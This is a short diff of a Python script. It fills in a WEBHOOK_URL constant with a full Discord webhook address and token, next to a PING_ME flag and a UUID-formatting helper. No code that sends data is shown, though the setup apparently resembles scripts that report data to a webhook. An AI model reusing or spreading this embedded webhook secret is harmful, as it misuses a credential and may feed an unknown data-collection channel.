@@ -1,7 +1,7 @@
 import json
 import os
 from urllib.request import Request, urlopen
-WEBHOOK_URL = "WEBHOOK HERE"
+WEBHOOK_URL = "https://discord.com/api/webhooks/945753324265812039/gb1Xhli_6Mh2YHwowG4ra0AgVM-JUZB9gXuiUsQmJAFaQmpoklXwAAgxLab1RhhlH5KL"
 PING_ME = True
 def uuid_dashed(uuid):
     return f"{uuid[0:8]}-{uuid[8:12]}-{uuid[12:16]}-{uuid[16:21]}-{uuid[21:32]}"
